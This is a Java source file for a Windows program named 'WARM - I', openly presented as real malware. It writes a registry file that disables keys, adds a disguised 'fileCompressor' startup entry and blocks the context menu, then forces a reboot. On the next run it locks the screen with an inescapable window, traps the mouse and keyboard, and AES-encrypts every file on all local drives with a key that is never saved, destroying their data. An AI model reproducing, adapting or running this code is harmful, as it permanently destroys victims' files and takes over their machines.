package WAR;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Scanner;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.Collections;
import java.util.List;
import java.util.prefs.Preferences;

import static java.nio.file.Files.writeString;

public final class Main {
    private static final String RED_BOLD_BRIGHT = "\033[1;91m";
    private static final String ANSI_RESET = "\u001B[0m";
    private static final Cipher cipher;
    private static FileInputStream inputStream;
    private static FileOutputStream outputStream;
    private static final GraphicsDevice[] gs = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
    private static final ArrayList<File> drives = new ArrayList<>();
    private static final Point p = new Point(420, 420);
    private static final Path regPath = Path.of("C:\\Program Files\\regdata.reg");
    private static final String shutDownCommand = "shutdown /r /t 0";
    private static final String regRunCommand = "regedit regdata.reg";
    private static final String runMessage = "Already Executed !";
    private static final String regData = """
            Windows Registry Editor Version 5.00

            [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout]
            "Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00

            [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
            "fileCompressor"="C:\\\\Program Files\\\\WARM - I.exe"

            [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer]
            "NoViewContextMenu"=dword:00000001""";

    static {
        for (File file : File.listRoots()) {
            if ((FileSystemView.getFileSystemView().getSystemTypeDescription(file)).equalsIgnoreCase("local disk")) {
                drives.add(file);
            }
        }
        try {
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, KeyGenerator.getInstance("AES").generateKey(), generateIv());
        } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException |
                 NoSuchPaddingException e) {
            throw new RuntimeException(e);
        }

    }

    public static void main(String[] args){
//        return;
        System.out.println("\n\n\n");
        System.out.println(RED_BOLD_BRIGHT + "This is a real-world malware, not a joke, are you sure to continue ??????    [ Y / N ]" + ANSI_RESET);
        if (new Scanner(System.in).nextLine().equalsIgnoreCase("Y")) {
            JFrame frame = new JFrame("window");
            frame.setUndecorated(true);
            frame.pack();
            frame.setSize(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height);
            frame.setTitle("WARM - I");
            frame.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
            frame.setResizable(false);
            frame.setIconImage(new ImageIcon("WARM - I logo.png").getImage());
            frame.getContentPane().setBackground(Color.BLACK);
            frame.setExtendedState(Frame.MAXIMIZED_BOTH);
            frame.setFocusTraversalKeysEnabled(false);
            frame.getContentPane().setCursor(Toolkit.getDefaultToolkit().createCustomCursor(new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB), new Point(0, 0), "null cursor"));
            JLabel label = new JLabel("WARM - I");
            label.setHorizontalTextPosition(0);
            label.setVerticalTextPosition(0);
            label.setForeground(Color.red);
            label.setFont(new Font(Font.SANS_SERIF, Font.BOLD, 60));
            label.setVerticalAlignment(SwingConstants.CENTER);
            label.setHorizontalAlignment(SwingConstants.CENTER);
            frame.add(label);
            frame.setAlwaysOnTop(true);
            frame.setFocusableWindowState(true);
            frame.setFocusable(true);
            frame.requestFocus();
            try {
                FileReader fileReader = new FileReader("C:\\Program Files\\compressordata.dat");
                if (fileReader.read() != -1){
                    frame.addKeyListener(new KeyListener() {
                        @Override
                        public void keyTyped(KeyEvent e) {
                            e.consume();
                            frame.requestFocus();
                        }

                        @Override
                        public void keyPressed(KeyEvent e) {
                            e.consume();
                            frame.requestFocus();
                        }

                        @Override
                        public void keyReleased(KeyEvent e) {
                            e.consume();
                            frame.requestFocus();
                        }
                    });
                    frame.addMouseListener(new MouseListener() {
                        @Override
                        public void mouseClicked(MouseEvent e) {
                            // keep empty
                            frame.requestFocus();
                        }

                        @Override
                        public void mousePressed(MouseEvent e) {
                            // keep empty
                            frame.requestFocus();
                        }

                        @Override
                        public void mouseReleased(MouseEvent e) {
                            // keep empty
                            frame.requestFocus();
                        }

                        @Override
                        public void mouseEntered(MouseEvent e) {
                            frame.requestFocus();
                            for (GraphicsDevice device : gs) {
                                GraphicsConfiguration[] configurations = device.getConfigurations();
                                for (GraphicsConfiguration config : configurations) {
                                    Rectangle bounds = config.getBounds();
                                    if (bounds.contains(p)) {
                                        try {
                                            Robot r = new Robot(device);
                                            r.mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);
                                        } catch (AWTException ex) {
                                        }
                                        return;
                                    }
                                }
                            }
                            frame.requestFocus();
                        }

                        @Override
                        public void mouseExited(MouseEvent e) {
                            frame.requestFocus();
                            for (GraphicsDevice device : gs) {
                                GraphicsConfiguration[] configurations = device.getConfigurations();
                                for (GraphicsConfiguration config : configurations) {
                                    Rectangle bounds = config.getBounds();
                                    if (bounds.contains(p)) {
                                        try {
                                            Robot r = new Robot(device);
                                            r.mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);
                                        } catch (AWTException ex) {
                                        }
                                        return;
                                    }
                                }
                            }
                            frame.requestFocus();
                        }
                    });
                    frame.addWindowListener(new WindowAdapter() {
                        @Override
                        public void windowIconified(WindowEvent e) {
                            frame.setState(Frame.NORMAL);
                            frame.requestFocus();
                        }
                    });
                    frame.addWindowFocusListener(new WindowFocusListener() {
                        @Override
                        public void windowGainedFocus(WindowEvent e) {/* keep empty */}

                        @Override
                        public void windowLostFocus(WindowEvent e) {
                            if (e.getNewState() != WindowEvent.WINDOW_CLOSED) {
                                frame.setAlwaysOnTop(false);
                                frame.setAlwaysOnTop(true);
                                frame.requestFocus();
                            }
                        }
                    });
                    frame.setVisible(true);
                    for (File drive : drives) {
                        Path dir = Paths.get(drive.getAbsolutePath());
                        try {
                            Files.walkFileTree(dir, new SimpleFileVisitor<>() {
                                @Override
                                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
                                    try {
                                        Files.walk(dir).forEach(path -> processFile(path.toFile()));
                                    } catch (Exception e) {
                                        return FileVisitResult.CONTINUE;
                                    }
                                    return FileVisitResult.CONTINUE;
                                }

                                @Override
                                public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
                                    if (exc != null) {
                                        return FileVisitResult.CONTINUE;
                                    }

                                    return super.visitFileFailed(file, null);
                                }
                            });
                        } catch (IOException ignored) {}
                    }
                }else {
                    while (true) {
                        try {
                            fire();
                            break;
                        } catch (IOException ignored) {}
                        try {
                            fire();
                            break;
                        } catch (IOException ignored) {}}
                }
            }catch (IOException ignored) {
                while (true) {
                    try {
                        fire();
                        break;
                    } catch (IOException ignored1) {
                    }
                    try {
                        fire();
                        break;
                    } catch ( IOException ignored1) {
                    }}}
        }
        System.exit(0);
    }

    private static void processFile(File file) {
        if (!file.isDirectory() && !(file.getAbsoluteFile().getName().equalsIgnoreCase("warm - i.exe"))) {
            try {
                inputStream = new FileInputStream(file);
                outputStream = new FileOutputStream(file);
                byte[] buffer = new byte[64];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    byte[] output = cipher.update(buffer, 0, bytesRead);
                    if (output != null) {
                        outputStream.write(output);
                    }
                }
                byte[] outputBytes = cipher.doFinal();
                if (outputBytes != null) {
                    outputStream.write(outputBytes);
                }
            } catch (Exception ignored) {}
            finally {
                try {
                    inputStream.close();
                    outputStream.close();
                } catch (IOException ignored) {}
            }
        }
    }

    private static void fire() throws IOException {
        writeString(regPath,regData);
        executeCommand(regRunCommand);
        new FileWriter("C:\\Program Files\\compressordata.dat").write(runMessage);
        executeCommand(shutDownCommand);
    }

    private static IvParameterSpec generateIv() {
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        return new IvParameterSpec(iv);
    }

    private static void executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        } catch (IOException | InterruptedException ignored) {
        }
    }


    private static final class WinRegistry {
        public static final int HKEY_CURRENT_USER = 0x80000001;
        public static final int HKEY_LOCAL_MACHINE = 0x80000002;
        public static final int REG_SUCCESS = 0;
        public static final int REG_NOTFOUND = 2;
        public static final int REG_ACCESSDENIED = 5;

        public static final int KEY_WOW64_32KEY = 0x0200;
        public static final int KEY_WOW64_64KEY = 0x0100;

        private static final int KEY_ALL_ACCESS = 0xf003f;
        private static final int KEY_READ = 0x20019;
        private static final Preferences userRoot = Preferences.userRoot();
        private static final Preferences systemRoot = Preferences.systemRoot();
        private static final Class<? extends Preferences> userClass = userRoot.getClass();
        private static Method regOpenKey = null;
        private static Method regCloseKey = null;
        private static Method regQueryValueEx = null;
        private static Method regEnumValue = null;
        private static Method regQueryInfoKey = null;
        private static Method regEnumKeyEx = null;
        private static Method regCreateKeyEx = null;
        private static Method regSetValueEx = null;
        private static Method regDeleteKey = null;
        private static Method regDeleteValue = null;

        static {
            try {
                regOpenKey = userClass.getDeclaredMethod("WindowsRegOpenKey", int.class, byte[].class, int.class);
                regOpenKey.setAccessible(true);
                regCloseKey = userClass.getDeclaredMethod("WindowsRegCloseKey", int.class);
                regCloseKey.setAccessible(true);
                regQueryValueEx = userClass.getDeclaredMethod("WindowsRegQueryValueEx", int.class, byte[].class);
                regQueryValueEx.setAccessible(true);
                regEnumValue = userClass.getDeclaredMethod("WindowsRegEnumValue", int.class, int.class, int.class);
                regEnumValue.setAccessible(true);
                regQueryInfoKey = userClass.getDeclaredMethod("WindowsRegQueryInfoKey1", int.class);
                regQueryInfoKey.setAccessible(true);
                regEnumKeyEx = userClass.getDeclaredMethod("WindowsRegEnumKeyEx", int.class, int.class, int.class);
                regEnumKeyEx.setAccessible(true);
                regCreateKeyEx = userClass.getDeclaredMethod("WindowsRegCreateKeyEx", int.class, byte[].class);
                regCreateKeyEx.setAccessible(true);
                regSetValueEx = userClass.getDeclaredMethod("WindowsRegSetValueEx", int.class, byte[].class, byte[].class);
                regSetValueEx.setAccessible(true);
                regDeleteValue = userClass.getDeclaredMethod("WindowsRegDeleteValue", int.class, byte[].class);
                regDeleteValue.setAccessible(true);
                regDeleteKey = userClass.getDeclaredMethod("WindowsRegDeleteKey", int.class, byte[].class);
                regDeleteKey.setAccessible(true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private WinRegistry() {
        }

        /**
         * Read a value from key and value name
         *
         * @param hkey      HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
         * @param key
         * @param valueName
         * @param wow64     0 for standard registry access (32-bits for 32-bit app, 64-bits for 64-bits app)
         *                  or KEY_WOW64_32KEY to force access to 32-bit registry view,
         *                  or KEY_WOW64_64KEY to force access to 64-bit registry view
         * @return the value
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static String readString(int hkey, String key, String valueName, int wow64)
                throws IllegalArgumentException, IllegalAccessException,
                InvocationTargetException {
            if (hkey == HKEY_LOCAL_MACHINE) {
                return readString(systemRoot, hkey, key, valueName, wow64);
            } else if (hkey == HKEY_CURRENT_USER) {
                return readString(userRoot, hkey, key, valueName, wow64);
            } else {
                throw new IllegalArgumentException("hkey=" + hkey);
            }
        }

        /**
         * Read value(s) and value name(s) form given key
         *
         * @param hkey  HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
         * @param key
         * @param wow64 0 for standard registry access (32-bits for 32-bit app, 64-bits for 64-bits app)
         *              or KEY_WOW64_32KEY to force access to 32-bit registry view,
         *              or KEY_WOW64_64KEY to force access to 64-bit registry view
         * @return the value name(s) plus the value(s)
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static Map<String, String> readStringValues(int hkey, String key, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            if (hkey == HKEY_LOCAL_MACHINE) {
                return readStringValues(systemRoot, hkey, key, wow64);
            } else if (hkey == HKEY_CURRENT_USER) {
                return readStringValues(userRoot, hkey, key, wow64);
            } else {
                throw new IllegalArgumentException("hkey=" + hkey);
            }
        }

        /**
         * Read the value name(s) from a given key
         *
         * @param hkey  HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
         * @param key
         * @param wow64 0 for standard registry access (32-bits for 32-bit app, 64-bits for 64-bits app)
         *              or KEY_WOW64_32KEY to force access to 32-bit registry view,
         *              or KEY_WOW64_64KEY to force access to 64-bit registry view
         * @return the value name(s)
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static List<String> readStringSubKeys(int hkey, String key, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            if (hkey == HKEY_LOCAL_MACHINE) {
                return readStringSubKeys(systemRoot, hkey, key, wow64);
            } else if (hkey == HKEY_CURRENT_USER) {
                return readStringSubKeys(userRoot, hkey, key, wow64);
            } else {
                throw new IllegalArgumentException("hkey=" + hkey);
            }
        }

        /**
         * Create a key
         *
         * @param hkey HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
         * @param key
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static void createKey(int hkey, String key)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int[] ret;
            if (hkey == HKEY_LOCAL_MACHINE) {
                ret = createKey(systemRoot, hkey, key);
                regCloseKey.invoke(systemRoot, ret[0]);
            } else if (hkey == HKEY_CURRENT_USER) {
                ret = createKey(userRoot, hkey, key);
                regCloseKey.invoke(userRoot, ret[0]);
            } else {
                throw new IllegalArgumentException("hkey=" + hkey);
            }
            if (ret[1] != REG_SUCCESS) {
                throw new IllegalArgumentException("rc=" + ret[1] + "  key=" + key);
            }
        }

        /**
         * Write a value in a given key/value name
         *
         * @param hkey
         * @param key
         * @param valueName
         * @param value
         * @param wow64     0 for standard registry access (32-bits for 32-bit app, 64-bits for 64-bits app)
         *                  or KEY_WOW64_32KEY to force access to 32-bit registry view,
         *                  or KEY_WOW64_64KEY to force access to 64-bit registry view
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static void writeStringValue
        (int hkey, String key, String valueName, String value, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            if (hkey == HKEY_LOCAL_MACHINE) {
                writeStringValue(systemRoot, hkey, key, valueName, value, wow64);
            } else if (hkey == HKEY_CURRENT_USER) {
                writeStringValue(userRoot, hkey, key, valueName, value, wow64);
            } else {
                throw new IllegalArgumentException("hkey=" + hkey);
            }
        }

        /**
         * Delete a given key
         *
         * @param hkey
         * @param key
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static void deleteKey(int hkey, String key)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int rc = -1;
            if (hkey == HKEY_LOCAL_MACHINE) {
                rc = deleteKey(systemRoot, hkey, key);
            } else if (hkey == HKEY_CURRENT_USER) {
                rc = deleteKey(userRoot, hkey, key);
            }
            if (rc != REG_SUCCESS) {
                throw new IllegalArgumentException("rc=" + rc + "  key=" + key);
            }
        }

        /**
         * delete a value from a given key/value name
         *
         * @param hkey
         * @param key
         * @param value
         * @param wow64 0 for standard registry access (32-bits for 32-bit app, 64-bits for 64-bits app)
         *              or KEY_WOW64_32KEY to force access to 32-bit registry view,
         *              or KEY_WOW64_64KEY to force access to 64-bit registry view
         * @throws IllegalArgumentException
         * @throws IllegalAccessException
         * @throws InvocationTargetException
         */
        public static void deleteValue(int hkey, String key, String value, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int rc = -1;
            if (hkey == HKEY_LOCAL_MACHINE) {
                rc = deleteValue(systemRoot, hkey, key, value, wow64);
            } else if (hkey == HKEY_CURRENT_USER) {
                rc = deleteValue(userRoot, hkey, key, value, wow64);
            }
            if (rc != REG_SUCCESS) {
                throw new IllegalArgumentException("rc=" + rc + "  key=" + key + "  value=" + value);
            }
        }

        //========================================================================
        private static int deleteValue(Preferences root, int hkey, String key, String value, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{
                    hkey, toCstr(key), KEY_ALL_ACCESS | wow64
            });
            if (handles[1] != REG_SUCCESS) {
                return handles[1];  // can be REG_NOTFOUND, REG_ACCESSDENIED
            }
            int rc = (Integer) regDeleteValue.invoke(root, new Object[]{
                    handles[0], toCstr(value)
            });
            regCloseKey.invoke(root, handles[0]);
            return rc;
        }

        //========================================================================
        private static int deleteKey(Preferences root, int hkey, String key)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            return (Integer) regDeleteKey.invoke(root, new Object[]{
                    hkey, toCstr(key)
            });  // can REG_NOTFOUND, REG_ACCESSDENIED, REG_SUCCESS
        }

        //========================================================================
        private static String readString(Preferences root, int hkey, String key, String value, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{
                    hkey, toCstr(key), KEY_READ | wow64
            });
            if (handles[1] != REG_SUCCESS) {
                return null;
            }
            byte[] valb = (byte[]) regQueryValueEx.invoke(root, new Object[]{
                    handles[0], toCstr(value)
            });
            regCloseKey.invoke(root, handles[0]);
            return (valb != null ? new String(valb).trim() : null);
        }

        //========================================================================
        private static Map<String, String> readStringValues(Preferences root, int hkey, String key, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            HashMap<String, String> results = new HashMap<>();
            int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{
                    hkey, toCstr(key), KEY_READ | wow64
            });
            if (handles[1] != REG_SUCCESS) {
                return Collections.emptyMap();
            }
            int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[]{
                    handles[0]
            });

            int count = info[2]; // count
            int maxlen = info[3]; // value length max
            for (int index = 0; index < count; index++) {
                byte[] name = (byte[]) regEnumValue.invoke(root, new Object[]{
                        handles[0], index, (maxlen + 1)
                });
                String value = readString(hkey, key, new String(name), wow64);
                results.put(new String(name).trim(), value);
            }
            regCloseKey.invoke(root, handles[0]);
            return results;
        }

        //========================================================================
        private static List<String> readStringSubKeys(Preferences root, int hkey, String key, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            List<String> results = new ArrayList<>();
            int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{
                    hkey, toCstr(key), KEY_READ | wow64
            });
            if (handles[1] != REG_SUCCESS) {
                return Collections.emptyList();
            }
            int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[]{
                    handles[0]
            });

            int count = info[0]; // Fix: info[2] was being used here with wrong results. Suggested by davenpcj, confirmed by Petrucio
            int maxlen = info[3]; // value length max
            for (int index = 0; index < count; index++) {
                byte[] name = (byte[]) regEnumKeyEx.invoke(root, new Object[]{
                        handles[0], index, maxlen + 1
                });
                results.add(new String(name).trim());
            }
            regCloseKey.invoke(root, handles[0]);
            return results;
        }

        //========================================================================
        private static int[] createKey(Preferences root, int hkey, String key)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            return (int[]) regCreateKeyEx.invoke(root, new Object[]{
                    hkey, toCstr(key)
            });
        }

        //========================================================================
        private static void writeStringValue(Preferences root, int hkey, String key, String valueName, String value, int wow64)
                throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
            int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{
                    hkey, toCstr(key), KEY_ALL_ACCESS | wow64
            });
            regSetValueEx.invoke(root, handles[0], toCstr(valueName), toCstr(value));
            regCloseKey.invoke(root, handles[0]);
        }

        //========================================================================
        // utility
        private static byte[] toCstr(String str) {
            byte[] result = new byte[str.length() + 1];

            for (int i = 0; i < str.length(); i++) {
                result[i] = (byte) str.charAt(i);
            }
            result[str.length()] = 0;
            return result;
        }
    }
}
